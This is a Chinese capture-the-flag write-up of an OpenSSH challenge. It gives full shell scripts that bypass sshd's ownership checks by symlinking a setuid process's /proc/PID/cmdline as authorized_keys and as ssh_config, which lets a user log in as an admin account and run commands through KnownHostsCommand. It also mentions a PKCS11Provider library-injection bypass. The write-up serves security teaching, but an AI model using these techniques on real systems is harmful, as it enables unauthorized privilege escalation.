# [Misc] 小Z的服务器

- 命题人：lrh2000（题面：xmcp）
- Flag 1：350 分
- Flag 2：300 分

## 题目描述

<p>看呐，小 Z 给组里的服务器装好了系统！</p>
<p>看呐，小 Z 在服务器上安装了 OpenSSH 服务！</p>
<p>看呐，小 Z 设置好了公钥登录！</p>
<p>看呐，小 Z 新建了一个管理员账号，在根目录放了一个 Flag！</p>
<p>看呐，小 Z 把管理员账号的家目录设置成了跟自己一样！</p>
<p>看……诶，这样做是不是有什么问题来着？</p>
<p>究竟是什么问题呢？</p>
<p><strong>注意：本题终端将在连接 10 分钟后关闭，如需长时间调试建议下载源码运行。</strong></p>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>Flag 1: <code>authorized_keys</code> <a target="_blank" rel="noopener noreferrer" href="https://github.com/openssh/openssh-portable/blob/2dc328023f60212cd29504fc05d849133ae47355/regress/check-perm.c#L93-L149">生效条件</a><ul>
<li>函数 <code>realpath</code> 干了什么？</li>
</ul>
</li>
<li>Flag 2: <code>ssh_config</code> <a target="_blank" rel="noopener noreferrer" href="https://man.openbsd.org/ssh_config">官方文档</a><ul>
<li>形如 <code>*Command</code> 的配置项可以干什么？</li>
</ul>
</li>
</ul>
</div>

**【终端交互：连接到题目】**

**[【附件：下载题目源码（prob05-src.tar.gz）】](attachment/prob05-src.tar.gz)**

## 预期解法

预期考察点是OpenSSH源码审计、一点脑洞和避坑能力。

本题开启了sshd服务，管理员帐号的家目录在内容上是完全可控的，登录管理员帐号即可获得Flag 1，因此自然的思路是能否直接“帮”管理员配置一个公私钥登录。简单尝试可知，直接的配置不会生效，这是因为在默认配置下sshd会检查`authorized_keys`文件的所有者和可写性是否正常（参见[`sshd_config`官方文档](https://www.freebsd.org/cgi/man.cgi?sshd_config)中的`StrictModes`）。

文档中没有详细介绍检查的规则，但阅读[相应源代码](https://github.com/openssh/openssh-portable/blob/2dc328023f60212cd29504fc05d849133ae47355/regress/check-perm.c#L93-L149)可知检查过程会首先解析符号链接（根据[`realpath`函数文档](https://man7.org/linux/man-pages/man3/realpath.3.html)），随后检查文件所有者是否是被登录用户自己或者root（函数`platform_sys_dir_uid`）。这意味着如果可以找到内容可控的，并且由root持有的文件，就可以直接创建相应的符号链接骗过上述检查流程。

有没有符合条件的文件呢？对于setuid的程序（如`su`），文件`/proc/PID/cmdline`的所有者是root并且内容取决于传入的命令行参数，可以注入公钥充当`authorized_keys`的角色（注意这个文件不需要完全合法，不合法的行会被忽略，同时不会引起错误），因此Flag 1能通过如下方法拿到：
```sh
#! /bin/sh

if [ ! -f ~/.ssh/id_rsa ]; then
        echo '' | ssh-keygen -N ""
fi

AUTH_KEY=$(cat ~/.ssh/id_rsa.pub)

su root -c $'\n'"$AUTH_KEY" &
sleep 0.1

SU_PID=$!
kill -STOP $SU_PID

AUTH_FILE=/proc/$!/cmdline

rm -f ~/.ssh/authorized_keys
ln -s $AUTH_FILE ~/.ssh/authorized_keys

chmod +x ~ ~/.ssh
rm -f ~/.ssh/config
ssh -oStrictHostKeyChecking=no admin2@localhost cat /flag2

kill -CONT $SU_PID
kill -TERM $SU_PID
wait
```

对于Flag 2，相应的帐号可以用同样的办法进行登录，但是用户shell被设置为了执行一条不通的ssh尝试。通过这个ssh尝试，其实可以注入任意命令执行。从[`ssh_config`官方文件](https://www.freebsd.org/cgi/man.cgi?ssh_config)可知配置文件中有较多按字面意思即可命令注入的配置项，如`ProxyCommand`。不过尝试后可以发现`ProxyCommand`是通过用户shell执行的，但是这里用户shell因为被配置为了一次固定的ssh操作而没有执行命令的能力（这里可能会坑到部分选手）。

再仔细阅读下文档会发现，`ProxyCommand`明确说了会调用用户shell来执行命令，而`KnownHostsCommand`则没有明说，那么有没有可能后者不会调用用户shell呢？事实的确如此，可以本地通过`strace`测试进行简单的验证，因此Flag 2可以通过如下方法获取（`ssh_config`也需要绕过所有者检查，同时必须保证语法正确，这可以通过手动调用`execlp`使得`/proc/PID/cmdline`文件完全可控，即随便乱填`argv[0]`）：
```sh
#! /bin/sh

if [ ! -f ~/.ssh/id_rsa ]; then
        echo '' | ssh-keygen -N ""
fi

AUTH_KEY=$(cat ~/.ssh/id_rsa.pub)

su root -c $'\n'"$AUTH_KEY" &
sleep 0.1

SU_PID=$!
kill -STOP $SU_PID

AUTH_FILE=/proc/$SU_PID/cmdline

rm -f ~/.ssh/authorized_keys
ln -s $AUTH_FILE ~/.ssh/authorized_keys

CFG_CONTENT="KnownHostsCommand /bin/chmod +r /flag2\n"

python3 -c "__import__('os').execlp('su', '$CFG_CONTENT')" &
sleep 0.1

PY_PID=$!
kill -STOP $PY_PID

CFG_FILE=/proc/$PY_PID/cmdline

rm -f ~/.ssh/config
ln -s $CFG_FILE ~/.ssh/config

chmod +x ~ ~/.ssh
ssh -F /dev/null -oStrictHostKeyChecking=no admin2@localhost
cat /flag2

kill -CONT $SU_PID
kill -TERM $SU_PID
kill -CONT $PY_PID
kill -TERM $PY_PID
wait
```

此外，Flag 2存在一些非预期解法，如利用`ssh_config`配置中的`PKCS11Provider`注入动态链接库从而任意代码执行，具体可参考优秀选手WP（TODO：补充链接）。
